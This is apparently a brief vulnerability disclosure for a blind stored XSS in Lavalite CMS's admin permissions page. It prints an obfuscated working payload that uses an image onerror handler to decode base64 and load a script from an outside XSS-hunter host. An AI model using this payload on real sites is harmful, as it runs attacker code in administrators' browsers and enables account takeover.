# Description
Blind XSS triggered at permissions page of lavalite CMS admin account.
# Payload USED
```
"><img src=x id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8vYmVlZmVlLnhzcy5odCI7ZG9jdW1lbnQuYm9keS5hcHBlbmRDaGlsZChhKTs&#61; onerror=eval(atob(this.id))>
```
# POC
* go to permissions page edit/create permission with xss payload
* Booyah!!! XSS triggered.
# PermaLinks
[drive link](https://drive.google.com/drive/folders/1zlSYQ5MUsMXBsjUaK_B5hFhblOHyOmjt?usp=sharing)
